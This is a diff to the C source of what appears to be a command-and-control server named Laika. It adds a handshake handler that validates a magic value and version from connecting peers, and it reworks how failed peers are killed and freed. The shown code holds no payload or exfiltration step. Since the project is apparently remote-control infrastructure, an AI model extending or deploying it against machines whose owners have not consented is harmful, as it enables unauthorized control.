@@ -1,4 +1,5 @@
 #include "lmem.h"
+#include "lsocket.h"
 #include "lerror.h"
 
 #include "cnc.h"
@@ -8,7 +9,28 @@ size_t laikaC_pktSizeTbl[LAIKAPKT_MAXNONE] = {
 };
 
 void laikaC_pktHandler(struct sLaika_peer *peer, uint8_t id, void *uData) {
-    printf("got %d packet id!\n", id);
+    switch (id) {
+        case LAIKAPKT_HANDSHAKE_REQ: {
+            char magicBuf[LAIKA_MAGICLEN];
+            uint8_t major, minor;
+
+            laikaS_read(&peer->sock, (void*)magicBuf, LAIKA_MAGICLEN);
+            major = laikaS_readByte(&peer->sock);
+            minor = laikaS_readByte(&peer->sock);
+
+            if (memcmp(magicBuf, LAIKA_MAGIC, LAIKA_MAGICLEN) != 0
+                || major != LAIKA_VERSION_MAJOR
+                || minor != LAIKA_VERSION_MINOR)
+                LAIKA_ERROR("invalid handshake request!");
+
+            /* queue response */
+            laikaS_writeByte(&peer->sock, LAIKAPKT_HANDSHAKE_RES);
+            laikaS_writeByte(&peer->sock, laikaS_isBigEndian());
+
+            LAIKA_DEBUG("accepted handshake from peer %x\n", peer);
+            break;
+        }
+    }
 }
 
 struct sLaika_cnc *laikaC_newCNC(uint16_t port) {
@@ -36,7 +58,7 @@ void laikaC_freeCNC(struct sLaika_cnc *cnc) {
 void laikaC_killPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
     printf("peer %x killed!\n", peer);
     laikaP_rmvSock(&cnc->pList, (struct sLaika_socket*)peer);
-    laikaS_kill(&peer->sock);
+    laikaS_freePeer(peer);
 }
 
 bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout) {
@@ -76,15 +98,16 @@ bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout) {
 
         LAIKA_TRY
             if (evnts[i].pollIn && !laikaS_handlePeerIn(peer))
-                laikaC_killPeer(cnc, peer);
+                goto _CNCKILL;
 
             if (evnts[i].pollOut && !laikaS_handlePeerOut(peer))
-                laikaC_killPeer(cnc, peer);
+                goto _CNCKILL;
 
             if (!evnts[i].pollIn && !evnts[i].pollOut)
-                laikaC_killPeer(cnc, peer);
+                goto _CNCKILL;
 
         LAIKA_CATCH
+        _CNCKILL:
             laikaC_killPeer(cnc, peer);
         LAIKA_TRYEND
     }
